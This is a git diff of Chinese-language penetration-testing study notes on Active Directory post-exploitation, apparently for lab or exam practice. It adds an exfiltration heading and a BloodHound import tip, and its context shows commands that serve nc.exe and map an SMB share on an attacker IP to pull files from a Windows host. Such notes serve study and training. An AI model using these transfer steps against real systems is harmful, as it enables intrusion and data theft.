@@ -12,6 +12,8 @@ description: SharpHound, BloodHound, Active Directory, ASREPRoasting,DCSync Atta
 
 {% embed url="https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html" %}
 
+## Data Exfiltration，数据渗漏
+
 当需要从windows传送文件到kali上时，可以使用netcat。大致思路是在kali上下载好nc.exe，使用python3 -m http.server 这个指令启动一个临时的http服务器。在Windows上将nc.exe下载并使用nc.exe 和kali自带的netcat传送文件。
 
 在使用python impacket中的smb模组时，用impacket-smbserver指令，而不是smbserver.py。当我在使用smbserver.py时，我的kali出现了鼠标光标变成十字状的情况。当使用impacket-smbserver时，需要加上-smb2support，windows net.exe不支持smb1。
@@ -26,3 +28,7 @@ net use \\10.10.16.3\smb
 cd \\10.10.16.3\smb # 将当前的文件夹转到smb
 # 注意使用smb而不是samba_share作为Windows上smb share的名字
 ```
+
+## 数据处理
+
+在将SharpHound.exe产生的zip文件传到kali后，用Upload Data而不是Import Graph来导入文件。
